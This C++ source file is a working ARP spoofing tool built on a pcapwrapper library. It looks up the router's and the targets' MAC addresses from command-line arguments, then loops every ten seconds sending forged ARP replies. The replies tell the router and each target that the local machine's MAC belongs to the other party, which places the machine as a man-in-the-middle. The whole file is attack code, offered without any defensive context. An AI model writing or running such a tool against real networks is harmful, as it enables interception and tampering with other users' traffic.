#include <iostream>
#include <future>
#include <thread>
#include <chrono>
#include <string.h>

#include <pcapwrapper/controller.hpp>
#include <pcapwrapper/interfaces/interface.h>
#include <pcapwrapper/processors/processorempty.h>
#include <pcapwrapper/network/packages/arppackage.h>
#include <pcapwrapper/helpers/helper.h>
#include <pcapwrapper/network/builders/builder.h>
#include <pcapwrapper/network/builders/keys.h>

int main(int argc, char* argv[])
{
    if (argc < 2) {
        std::cout << "1. Interface " << std::endl;
        std::cout << "2. TargetIPs " << std::endl;
    }

    std::string interface = argv[1];
    const auto local_mac = PCAP::PCAPHelper::getMac(interface);
    const auto router_ip = PCAP::PCAPHelper::getRouterIp(interface);
    const auto router_mac = PCAP::PCAPHelper::getMac(router_ip, interface);

    std::vector<PCAP::IpAddress> targets_ip;
    std::for_each(&argv[2], &argv[argc], [&targets_ip](auto ip)
        { targets_ip.emplace_back(PCAP::IpAddress(ip)); });

    std::vector<PCAP::MacAddress> targets_mac;
    std::for_each(std::begin(targets_ip), std::end(targets_ip), [&targets_mac, &interface](auto ip)
        { targets_mac.emplace_back(PCAP::PCAPHelper::getMac(ip, interface)); });

    auto controller = PCAP::Controller<PCAP::Interface, PCAP::ProcessorEmpty>::getController(interface);
    controller->start();

    std::cout << "Started" << std::endl;

    while (true) {
        for (size_t i = 0; i < targets_ip.size(); ++i) {
            auto target_ip = targets_ip[i];
            auto target_mac = targets_mac[i];

            using namespace PCAP::PCAPBuilder;
            auto package_router = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
                                                            {Keys::Key_Eth_Mac_Src, Option{local_mac}},
                                                            {Keys::Key_Eth_Mac_Dst, Option{router_mac}},
                                                            {Keys::Key_Arp_Mac_Src, Option{local_mac}},
                                                            {Keys::Key_Arp_Mac_Dst, Option{router_mac}},
                                                            {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
                                                            {Keys::Key_Ip_Src, Option{target_ip}},
                                                            {Keys::Key_Ip_Dst, Option{router_ip}}});

            controller->write(package_router.getPackage(), 60);
            auto package_target = PCAP::PCAPBuilder::make_apr(std::map<Keys, Option>{
                                                            {Keys::Key_Eth_Mac_Src, Option{local_mac}},
                                                            {Keys::Key_Eth_Mac_Dst, Option{target_mac}},
                                                            {Keys::Key_Arp_Mac_Src, Option{local_mac}},
                                                            {Keys::Key_Arp_Mac_Dst, Option{target_mac}},
                                                            {Keys::Key_Arp_Opcode, Option{(unsigned char)0x02}},
                                                            {Keys::Key_Ip_Src, Option{router_ip}},
                                                            {Keys::Key_Ip_Dst, Option{target_ip}}});
            controller->write(package_target.getPackage(), 60);
        }
        using namespace std::chrono_literals;
        std::this_thread::sleep_for(10s);
    }
    controller->stop();
}
